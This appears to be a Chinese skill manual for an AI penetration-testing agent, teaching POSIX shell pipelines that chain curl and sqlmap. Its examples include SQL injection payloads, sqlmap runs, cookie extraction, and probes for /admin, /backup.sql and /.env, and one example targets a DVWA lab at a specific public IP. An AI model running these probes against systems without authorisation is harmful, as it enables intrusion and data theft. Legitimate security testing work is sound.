---
name: tooling/sh
description: |
  POSIX sh 工具手册（通用 shell 编排）。教 LLM 如何把任意工具（curl / python3 / sqlmap / nuclei / ...)
  组合成一条流水线——管道 / 重定向 / 子 shell / 循环 / 条件 / xargs / awk / grep。适用于任何
  需要"多步探测打成一条命令"的场景，不绑定特定漏洞类型。
  配合 run_command 工具使用——run_command 内部就是 sh -c <command>。
---

# sh 用法手册（POSIX）

`run_command(command="...")` 内部就是 `sh -c <command>`。所以你已经在 sh 上下文里写脚本——
本手册讲的是 shell 层面的"把任意工具拼起来"：管道 / 重定向 / 子 shell / 循环 / 条件 / xargs。
适用于所有漏洞类型的多步探测（任何能从 stdin / stdout 走数据的工具都能拼起来）。

容器内 shell 是 dash / sh（POSIX）—— **不是 bash**。所以避免使用：

| ❌ bash-only | ✅ POSIX 替代 |
|---|---|
| `[[ -f x ]]` | `[ -f x ]` |
| `arr=(a b c)` | `arr="a b c"` + `for x in $arr` |
| `<( ... )` 进程替换 | 写到 temp 文件再读 |
| `${x^^}` 大小写 | `echo "$x" \| tr a-z A-Z` |

## 核心模式（必会五种）

### 1. 管道：上一条工具的 stdout 作下一条的 stdin

```
curl -s '...' | grep -i error
sqlmap -u '...' --batch --disable-coloring 2>&1 | grep -E '(Title|Payload):'
```

`2>&1` 把 stderr 合并到 stdout，否则 stderr 会绕开管道直接喷出去。

### 2. 命令替换：把命令输出作字符串

```
LEN=$(curl -s -o /dev/null -w '%{size_download}' 'http://x/y')
echo "len=$LEN"
```

`$(...)` 比反引号 `` `...` `` 可读且支持嵌套。

### 3. 短路：只在前命令成功 / 失败时跑下一条

```
curl -s -f '...' && echo "OK" || echo "fail"
```

- `-f` 让 curl 在 HTTP 4xx/5xx 时退出非 0
- `A && B`：A 退出 0 才跑 B
- `A || B`：A 退出非 0 才跑 B

### 4. 循环：批量探测

```
for i in 1 2 3 4 5; do
  curl -s -o /dev/null -w "id=$i status=%{http_code}\n" "http://x/y?id=$i"
done
```

`seq 1 10` 在 dash 也有；连续 ID 探测：

```
for i in $(seq 1 20); do
  T=$(curl -s -o /dev/null -w '%{size_download}' "http://x/y?id=$i AND 1=1-- -")
  F=$(curl -s -o /dev/null -w '%{size_download}' "http://x/y?id=$i AND 1=2-- -")
  echo "id=$i true=$T false=$F"
done
```

### 5. 重定向：丢弃噪声

```
sqlmap -u '...' --batch 2>/dev/null | grep -i payload
sqlmap -u '...' --batch >/tmp/x.log 2>&1
```

## 实用片段

### 提取 cookie 头里的 session

```
echo "PHPSESSID=abc; security=low; csrf=xx" | tr ';' '\n' | grep -i phpsessid
# → PHPSESSID=abc
```

### 把多条 payload 的差分一次拍出来

```
for p in "1=1" "1=2" "1=3"; do
  L=$(curl -s -o /dev/null -w "%{size_download}" "http://x/y?id=1 AND $p-- -")
  T=$(curl -s -o /dev/null -w "%{time_total}" "http://x/y?id=1 AND $p-- -")
  echo "payload=\"$p\" len=$L time=$T"
done
```

### 串多个工具：sqlmap 找点 → 把 payload 拎出来

```
sqlmap -u 'http://x/y?id=1' -p id --batch --disable-coloring 2>&1 \
  | grep -i payload | head -1 \
  | awk -F': ' '{print $2}'
```

### 看响应 body + 状态码（一次）

```
curl -s -D - -o /tmp/body 'http://x/y?id=1' \
  && echo '---BODY---' \
  && head -c 500 /tmp/body
```

## 实战示例

### 示例 1：DVWA 多 payload 长度差分（一条命令拿全数据）

```
run_command({
  "command": "for p in 'AND 1=1' 'AND 1=2' 'AND 1=3' 'OR 1=1'; do L=$(curl -s -o /dev/null -b 'PHPSESSID=abc; security=low' -w '%{size_download}' \"http://49.234.23.42:8888/vulnerabilities/sqli/?id=1' $p-- -&Submit=Submit\"); echo \"payload=$p len=$L\"; done",
  "tag": "sh-multi-payload",
  "timeout_seconds": 60
})
```

### 示例 2：sqlmap stdout 仅留关键行

```
run_command({
  "command": "sqlmap -u 'http://x/y?id=1' -p id --cookie='...' --batch --disable-coloring 2>&1 | grep -E '(Title|Payload|back-end DBMS|injectable|vulnerable):' | head -20",
  "tag": "sh-sqlmap-grep",
  "timeout_seconds": 240
})
```

### 示例 3：检测某 path 是否存在（HEAD + 状态码）

```
run_command({
  "command": "for path in /admin /api/users /backup.sql /.env; do echo \"$path $(curl -s -o /dev/null -w '%{http_code}' -b '...' http://x$path)\"; done",
  "tag": "sh-path-probe"
})
```

## 常见坑

1. **dash 不是 bash**：`[[ ]]`、数组、process substitution 都没；用 `[ ]` 和 `for x in ...`
2. **变量未引用导致分词**：`echo $x` 在 x 含空格时会断；用 `echo "$x"`
3. **管道隐藏退出码**：`A | B` 的退出码是 B 的；想看 A 是否成功，加 `set -o pipefail`（dash 不支持，要在脚本前 `#!/bin/bash` 切 bash）
4. **stderr 默认绕开管道**：grep stderr 内容时记得 `2>&1 | grep ...`
5. **`grep` 退出码非 0 等于 fail**：在 `&&` 链里没匹配到会断链；用 `grep ... || true` 兜
6. **`echo` 跨平台不一致**：转义字符建议用 `printf '%s\n' "$x"`
7. **POSIX `seq` 不保证存在**：dash 容器里通常有，但兜底写 `i=1; while [ $i -le 10 ]; do ...; i=$((i+1)); done`
